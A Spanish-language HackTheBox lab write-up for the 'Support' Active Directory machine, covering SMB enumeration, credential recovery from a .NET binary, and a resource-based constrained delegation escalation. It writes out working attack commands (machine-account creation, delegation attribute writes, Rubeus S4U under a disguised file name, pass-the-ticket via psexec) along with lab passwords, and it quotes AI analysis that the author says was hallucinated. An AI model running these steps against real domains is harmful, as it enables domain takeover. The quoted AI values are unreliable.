---
title: "Support htb"
machine: "Support"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
tags: ["Samba", "SMB", "Active Directory", "RCE", "Privesc"]
retired: true
summary: "es una windows por su TTL y el primer escaneo me revela que me enfrento por primera vez a un active directory"
draft: false
---
es una windows por su TTL y el primer escaneo me revela que me enfrento por primera vez a un active directory

# Enumeracion

```jsx
 sudo nmap 10.129.49.101 -sS -p- --open -min-rate 5000 -Pn -n -v -oG target
 
 Host is up (0.14s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49686/tcp open  unknown
49699/tcp open  unknown
60214/tcp open  unknown
```

hacemos un escaneo de detección de versiones y scripts predeterminados 

```jsx
❯ sudo nmap 10.129.49.101 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,49686,49699,60214 -Pn -n -sCV -oN targeted
[sudo] contraseña para kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-28 09:47 -0400
Nmap scan report for 10.129.49.101
Host is up (0.077s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-28 13:47:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
60214/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-28T13:48:22
|_  start_date: N/A
|_clock-skew: -10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.55 seconds

     ~/HTB/Support/nmap  took  1m 45s  ✔  
```

investigando encuentro esto

```jsx
Resumen del Objetivo
Hostname: DC

Dominio: support.htb

IP: 10.129.49.101

Sistema Operativo: Windows Server (confirmado por la presencia de servicios de Active Directory).

Análisis de Puertos y Servicios
La salida muestra un Controlador de Dominio (DC) con una superficie de ataque clásica de Windows:

DNS (53) / Kerberos (88) / LDAP (389, 3268): Servicios base de un entorno de 
Active Directory. LDAP identifica específicamente el dominio support.htb y el
sitio Default-First-Site-Name.

RPC (135) / RPC over HTTP (593, 49674): Puertos de gestión y comunicación entre 
procesos de Windows.

SMB (445): El escaneo de scripts (smb2-security-mode) indica que 
"Message signing enabled and required". Esto es un dato crítico de seguridad 
que confirma que el servidor no es vulnerable a ataques de SMB Relay.

WinRM (5985): El servicio de administración remota de Windows está expuesto 
sobre HTTP (Microsoft-HTTPAPI/2.0).

Puertos Dinámicos (49664-60214): Servicios RPC adicionales que suelen abrirse
 dinámicamente en servidores Windows.

Información de Tiempo
Server Time: 2026-04-28 13:47:31Z.

Clock Skew: -10 segundos (lo cual es muy preciso para ataques de Kerberos, que suelen fallar si el desfase es mayor a 5 minutos).
```

los registros dns no me dieron nada  

pero smb tiene habilitada la null session 

```jsx
❯ smbclient -L //10.129.49.101 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.49.101 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

     ~/HTB/Support/content  ✔  
```

enumerare con smbmap porque me permitira ver los permisos de los archivos pero ya de primeras support-tools no es comun 

```jsx
❯ smbmap -H 10.129.49.101 -u 'null' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.49.101:445	Name: support.htb         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	support-tools                                     	READ ONLY	support staff tools
	SYSVOL                                            	NO ACCESS	Logon server share 
[*] Closed 1 connections                                                                                                     

     ~/HTB/Support/content  took  4s  ✔  
```

ahorra viendo a que tengo y no tengo acceso solo toca enumerar lo primero obviamente es el recurso unico de este host

```jsx
❯ smbmap -H 10.129.49.101 -u 'null' -p '' -r 'support-tools'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.49.101:445	Name: support.htb         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	support-tools                                     	READ ONLY	support staff tools
	./support-tools
	dr--r--r--                0 Wed Jul 20 13:01:06 2022	.
	dr--r--r--                0 Sat May 28 07:18:25 2022	..
	fr--r--r--          2880728 Sat May 28 07:19:19 2022	7-ZipPortable_21.07.paf.exe
	fr--r--r--          5439245 Sat May 28 07:19:55 2022	npp.8.4.1.portable.x64.zip
	fr--r--r--          1273576 Sat May 28 07:20:06 2022	putty.exe
	fr--r--r--         48102161 Sat May 28 07:19:31 2022	SysinternalsSuite.zip
	fr--r--r--           277499 Wed Jul 20 13:01:07 2022	UserInfo.exe.zip
	fr--r--r--            79171 Sat May 28 07:20:17 2022	windirstat1_1_2_setup.exe
	fr--r--r--         44398000 Sat May 28 07:19:43 2022	WiresharkPortable64_3.6.5.paf.exe
	SYSVOL                                            	NO ACCESS	Logon server share 
[*] Closed 1 connections                                                                                                     
```

### Análisis del Inventario

1. **Herramientas Estándar:** `7-Zip`, `Notepad++` (`npp`), `PuTTY`, `WinDirStat` y `Wireshark`. Son herramientas comunes que los administradores de sistemas usan para tareas diarias.
2. **SysinternalsSuite.zip:** Este es un conjunto de herramientas oficiales de Microsoft muy potentes para administrar Windows. Aunque son útiles, suelen ser las versiones estándar.
3. **UserInfo.exe.zip :** Este es el archivo más sospechoso y prometedor. ¿Por qué?
    - **No es una herramienta comercial estándar:** A diferencia de PuTTY o Wireshark, "UserInfo" suena a una herramienta desarrollada internamente por la empresa para que el soporte técnico consulte datos de usuarios del dominio.
    - **Contexto de Active Directory:** En un DC, una herramienta que consulta información de usuarios probablemente necesita **credenciales** o una conexión a la base de datos de AD (LDAP) para funcionar.

![image.png](/img/support/1.png)

primero leo la configuracion del binario 

```jsx
 cat UserInfo.exe.config
─────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: UserInfo.exe.config
─────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ <?xml version="1.0" encoding="utf-8"?>
   2 │ <configuration>
   3 │     <startup> 
   4 │         <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
   5 │     </startup>
   6 │   <runtime>
   7 │     <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
   8 │       <dependentAssembly>
   9 │         <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
  10 │         <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
  11 │       </dependentAssembly>
  12 │     </assemblyBinding>
  13 │   </runtime>
  14 │ </configuration>
─────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

     ~/HTB/Support/content  ✔  

```

- **Naturaleza:** Aplicación de consola desarrollada en **.NET (C#)**.
- **Propósito:** Herramienta interna de soporte para consultar datos de usuarios en el **Active Directory** mediante **LDAP**.
- **Puntos Críticos Hallados (Strings):**
    - **`enc_password`**: Variable que almacena una contraseña cifrada.
    - **`getPassword`**: Método encargado de la lógica de descifrado.
    - **`LdapQuery`**: Funcionalidad de consulta directa al Controlador de Dominio.
- **Estado:** La credencial no está en texto plano, pero al ser .NET, es vulnerable a **descompilación completa** para extraer la clave de cifrado y el valor de `enc_password`.

# explotacion

bien decompilamos con 
`monodis UserInfo.exe > UserInfo.il`
bien le paso el archivo descompilado a la ia y sacamos esto 

La descompilación ha sido un éxito total. Al analizar el código CIL (Common Intermediate Language) que has generado con `monodis`, hemos pasado de la superficie a las entrañas del binario. Aquí tienes las piezas del puzzle que acabas de extraer:

### 1. Las Credenciales "Hardcoded"

Dentro del método constructor estático (`.cctor`), se definen los valores iniciales de la aplicación (líneas 318-330):

- **Usuario:** `support`
- **Password Cifrado (`enc_password`):** `nv98765432101234567890`

### 2. La Llave Maestra

En el método `getPassword` (línea 245), vemos que el programa invoca la lógica de descifrado pasando una "salt" o clave secundaria:

- **Clave de descifrado:** `armando`

### 3. El Algoritmo (Lógica de `Base64Decode`)

A pesar de su nombre, el método `Base64Decode` (líneas 257-316) no es solo un decodificador de Base64; es una implementación completa de **AES-256-CBC**. Este es el proceso exacto que sigue el binario:

1. **Entrada:** Toma la cadena `nv98765432101234567890` y la convierte de Base64 a bytes.
2. **Derivación de Clave:** Toma la cadena `armando`, calcula su hash **SHA256**.
3. **Configuración de AES:**
    - **Key:** Usa los 32 bytes del hash SHA256 de "armando".
    - **IV (Vector de Inicialización):** Usa los **primeros 16 bytes** del mismo hash SHA256.
4. **Descifrado:** Ejecuta el algoritmo AES para devolver la contraseña en texto plano.

---

ahora usaremos cyberchef

![image.png](/img/support/2.png)

- En la línea de código donde se define la contraseña cifrada, aparece la cadena: `nv98765432101234567890`.
- Esta cadena **no es un formato cifrado real** (no es Base64 válido ni un hash), lo que indica que la herramienta `monodis` probablemente no ha podido extraer el valor real del binario o que el ejecutable está utilizando una técnica para ocultar los strings que la descompilación básica no ha superado.

Para no seguir perdiendo el tiempo con suposiciones: el valor `nv98765432101234567890` que tenemos en el código descompilado es un **placeholder** o un error de extracción. Sin la cadena cifrada real, CyberChef no podrá devolver nada. 

el primer intento no funciono pero voy a seguir hilando con este archivo

## segundo intento

abri yo mismo el archivo y el error fue pasarselo a la ia para que lo analizara quien alucino, una vez lo abri manualmente la cosa va de ldap archivos y los datos anteriores eran erroneos este es el metodo getpassword

![image.png](/img/support/3.png)

como ven el analisis que me dio la ia fue totalmente erroneo la entrada,la configuracion el unico valor que dio bueno fue el de la key armando esto es un error que me hizo perder bastante tiempo lo mejor es revisar manualmentes los archivos y luego analizarlos con otras herramientas como ia ya que siempre estan sujetas a alucinaciones en la imagem estan los parametros correctos y abajo las credenciales validadas pd>el usuario lo encontre en el mismo archivo decompilado

![image.png](/img/support/4.png)

ya puedo leer ldap los siguientes pasos son logicos 

![image.png](/img/support/5.png)

siempre analizo las salidas con ia por si me pierdo algun detalle, el caso esta en que no haga el trabajo por ti por que da errores grandes como el intento 1

¡Ahí la tienes! El campo `info` te ha dado la llave:

> **info:** `Ironside47pleasure40Watchful`
> 

Esta es la contraseña del usuario **support**. Además, si te fijas en el atributo `memberOf`, verás que este usuario pertenece a:

1. `CN=Remote Management Users`: Esto confirma que puedes entrar por **WinRM**.
2. `CN=Shared Support Accounts`: Esto será clave para la escalada de privilegios más adelante.

y obtenemos la primera bandera!

```jsx
❯ evil-winrm -i 10.129.49.101 -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> cd C:\Users\support\Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
4a1b285b9aafe15884c2b4f00dd4a156
*Evil-WinRM* PS C:\Users\support\Desktop> 
```

el acceso inicial se logró mediante:

- **Information Disclosure:** Credenciales de LDAP expuestas en un binario .NET.
- **LDAP Enumeration:** Búsqueda de atributos personalizados (`info`) para encontrar contraseñas de otros usuarios.

# Escalada de privilegios

 el usuario `support` pertenece al grupo `Shared Support Accounts`, el cual tiene control total sobre el objeto del **Domain Controller** 

investigando un poco esta sera la primera estrategia a intentar para la escalada de privilegios 

### La Estrategia (Resource-Based Constrained Delegation)

El plan es el siguiente:

1. **Crear una computadora ficticia:** Usaremos un script para añadir una cuenta de máquina al dominio que nosotros controlemos.
2. **Configurar la delegación:** Le diremos al DC: "Oye, confía en esta nueva máquina para que pueda actuar en nombre de cualquier usuario (incluido el Administrador)".
3. **Abuso de S4U:** Usaremos **Rubeus** para pedir un ticket de Administrador y entrar al sistema.

![image.png](/img/support/6.png)

![image.png](/img/support/7.png)

una vez transferimos los archivos maliciosos a la maquina windows procedemos a crear la maquina traidora

```jsx
*Evil-WinRM* PS C:\ProgramData> Import-Module .\WinSysCheck.ps1
Import-Module .\MsUpdate.ps1
*Evil-WinRM* PS C:\ProgramData> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
*Evil-WinRM* PS C:\ProgramData> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\ProgramData> $ComputerSid
S-1-5-21-1677581083-3380853377-188903654-6101
*Evil-WinRM* PS C:\ProgramData> $SD = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))")
*Evil-WinRM* PS C:\ProgramData> $SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\ProgramData> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
*Evil-WinRM* PS C:\ProgramData> .\HealthCheck.exe hash /password

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Calculate Password Hash(es)

[*] Input password             : 
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!

*Evil-WinRM* PS C:\ProgramData> 
```

bien ha estas alturas estoy muy cansado no lo pacesera asi pero me tomo 4 horas y 64 minutos resolver esta maquina aqui tienen un resumen de los pasos finales 

## Escalada de Privilegios: De Rubeus a SYSTEM (RBCD Final)

Una vez que hemos inyectado los bytes de delegación en el **Domain Controller (DC)** y **Rubeus** ha generado el ticket suplantando al administrador, seguimos estos pasos para obtener la shell definitiva:

### 1. Generación del Ticket (En la Víctima)

Usamos el hash **RC4** de nuestra cuenta de máquina controlada (`attackersystem$`) para solicitar un Service Ticket (ST) para el usuario `administrator`.

PowerShell

`.\HealthCheck.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:host/dc.support.htb /outfile:ticket.kirbi.b64`

> **Nota:** El archivo resultante `ticket.kirbi.b64` contiene el ticket de Kerberos codificado en Base64.
> 

---

### 2. Preparación en Kali Linux

Copiamos el contenido del Base64 a nuestra máquina de ataque y realizamos la limpieza y conversión de formato (**Windows .kirbi -> Linux .ccache**).

Bash

`# 1. Limpiar espacios y saltos de línea del Base64
cat ticket.kirbi.b64 | tr -d '[:space:]' > ticket_clean.b64

# 2. Decodificar el binario
base64 -d ticket_clean.b64 > ticket.kirbi

# 3. Convertir al formato compatible con Impacket
impacket-ticketConverter ticket.kirbi ticket.ccache`

---

### 3. Ejecución del Pass-the-Ticket (PtT)

Con el ticket convertido, lo cargamos en la variable de entorno de nuestra sesión y lanzamos el ataque final hacia el DC sin necesidad de contraseñas.

Bash

`# Cargar el ticket en la sesión actual
export KRB5CCNAME=ticket.ccache

# Acceder mediante psexec (usando Kerberos)
impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb`

---

### 4. Post-Explotación (Flag)

Una vez dentro como `NT AUTHORITY\SYSTEM`, procedemos a la lectura de la flag de root:

DOS

`C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b57d643fa3ed3621ec12dc723b1831`

![image.png](/img/support/8.png)

**con esto mi primera active directory ha sido hackeada!**
